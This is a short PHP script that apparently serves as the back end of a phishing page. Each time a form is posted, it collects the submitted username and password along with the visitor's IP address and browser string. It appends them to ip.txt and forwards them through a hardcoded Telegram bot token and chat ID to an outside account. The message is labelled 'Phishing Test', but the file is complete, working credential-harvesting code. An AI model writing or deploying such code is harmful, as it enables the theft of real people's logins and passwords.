<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    }

    $browser = $_SERVER['HTTP_USER_AGENT'];

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $file = 'ip.txt';
    $logEntry = "IP: $ipaddress\nUser-Agent: $browser\nLogin: $username\nPassword: $password\n------------------\n";
    file_put_contents($file, $logEntry, FILE_APPEND);

    $TOKEN = "8121123464:AAHG_dJQyPTcPCIx-vCMmFv6IdoDlSRkWHk";
    $CHAT_ID = "860389338";
    $message = "🛡 Phishing Test\n\n👤 Login: $username\n🔑 Password: $password\n🌐 IP: $ipaddress\n📱 UA: $browser";

    $url = "https://api.telegram.org/bot$TOKEN/sendMessage";

    $data = [
        'chat_id' => $CHAT_ID,
        'text' => $message,
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    file_get_contents($url, false, stream_context_create($options));

    // Возвращаем JSON-ответ
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit();
}
?>
